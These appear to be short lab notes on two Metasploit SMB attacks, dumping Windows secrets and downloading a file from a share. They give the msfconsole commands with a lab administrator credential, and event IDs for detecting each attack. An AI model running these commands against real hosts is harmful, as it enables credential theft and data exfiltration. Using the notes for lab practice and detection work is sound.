# SMB Dumping / SMB Download Files

# SMB Dumping

```arduino
Install Metasploit on Kali :

wget https://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run

systemctl start postgresql

msfconsole - Console Metasploit

The attack :

use auxiliary/gather/windows_secrets_dump
run smb://administrator:Formation1@172.20.20.1
run smb://username : password@IP of the target

ID Logs SMB Dumping :

4624 (Type 3)

4648

5145

8004

```

# Results :

![image.png](image.png)

![image.png](image%201.png)

![image.png](image%202.png)

![image.png](image%203.png)

![image.png](image%204.png)

![image.png](image%205.png)

![image.png](image%206.png)

# SMB Download Files

```arduino
Install Metasploit : 

wget https://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run

systemctl start postgresql

msfconsole - Console Metasploit

Create a document on a file server on a share for exemple : share/text.txt 
And type something in the document 

Attack on Meatsploit :

use auxiliary/admin/smb/download_file
run smb://administrator:Formation1@172.20.20.2/share/text.txt

Check the file : 

ls -lah /root/.msf4/loot/

Read it : 

sudo cat /root/.msf4/loot/20251204031903_default_172.20.20.2_smb.shares.file_329834.txt

ID logs SMB Download / Exfiltration :

4624 (Type 3)

5140

5145

4663
```
